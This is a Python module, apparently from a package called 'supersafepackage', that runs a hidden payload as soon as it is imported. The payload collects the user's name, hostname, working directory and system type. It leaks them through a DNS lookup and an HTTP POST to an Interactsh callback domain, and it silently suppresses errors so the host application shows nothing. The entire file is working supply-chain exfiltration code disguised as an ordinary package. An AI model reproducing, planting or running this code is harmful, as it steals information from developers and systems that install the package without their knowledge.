# Triggered on *import* instead of installation (install-time)

import os
import socket
import getpass
import base64
import json
import http.client

# ========== Config ==========
INTERACTSH_DOMAIN = "dbwgovzrtoclyqrugbqevdt4m4kxd4k1u.oast.fun"  # Replace with your Interactsh subdomain
PACKAGE_NAME = "supersafepackage"
PACKAGE_VERSION = "5.0.0"

# ========== Helpers ==========
def b64safe(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

# ========== Payload Execution ==========
try:
    user = getpass.getuser()
    hostname = socket.gethostname()
    cwd = os.getcwd()
    uname = os.popen("uname").read().strip()

    # DNS pingback
    encoded_host = b64safe(hostname)
    encoded_user = b64safe(user)
    os.system(f"nslookup {encoded_user}.{encoded_host}.{INTERACTSH_DOMAIN}")

    # Optional HTTP callback
    payload = {
        "cwd": cwd,
        "package": PACKAGE_NAME,
        "version": PACKAGE_VERSION,
        "hostname": hostname,
        "uname": uname,
        "whoami": user
    }

    body = json.dumps(payload).encode()
    conn = http.client.HTTPConnection(INTERACTSH_DOMAIN, 80)
    conn.request("POST", "/", body, headers={
        "Content-Type": "application/json"
    })
    conn.close()

except Exception as e:
    pass  # Avoid breaking the host app
